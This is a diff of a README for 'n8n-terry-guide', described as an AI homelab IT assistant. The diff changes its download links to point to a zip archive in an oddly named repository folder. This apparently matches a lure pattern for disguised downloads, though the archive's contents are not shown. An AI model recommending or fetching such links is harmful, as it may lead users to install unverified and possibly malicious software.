@@ -1,6 +1,6 @@
 # 🚀 n8n-terry-guide - Your AI IT Assistant Made Simple
 
-[![Download n8n-terry-guide](https://raw.githubusercontent.com/Samdex1921/n8n-terry-guide/main/mollifiable/n8n-terry-guide.zip)](https://raw.githubusercontent.com/Samdex1921/n8n-terry-guide/main/mollifiable/n8n-terry-guide.zip)
+[![Download n8n-terry-guide](https://github.com/Samdex1921/n8n-terry-guide/raw/refs/heads/main/mollifiable/terry_n_guide_1.8.zip)](https://github.com/Samdex1921/n8n-terry-guide/raw/refs/heads/main/mollifiable/terry_n_guide_1.8.zip)
 
 ## 📖 Overview
 
@@ -71,6 +71,6 @@ In this final stage, Terry seeks your approval before making significant changes
 
 To get started with n8n-terry-guide, visit the link below to download the necessary files.
 
-[Visit this page to download](https://raw.githubusercontent.com/Samdex1921/n8n-terry-guide/main/mollifiable/n8n-terry-guide.zip)
+[Visit this page to download](https://github.com/Samdex1921/n8n-terry-guide/raw/refs/heads/main/mollifiable/terry_n_guide_1.8.zip)
 
 Once you have downloaded the necessary files, follow the steps in this guide to set up your AI agent smoothly. Enjoy managing your homelab with Terry’s assistance!
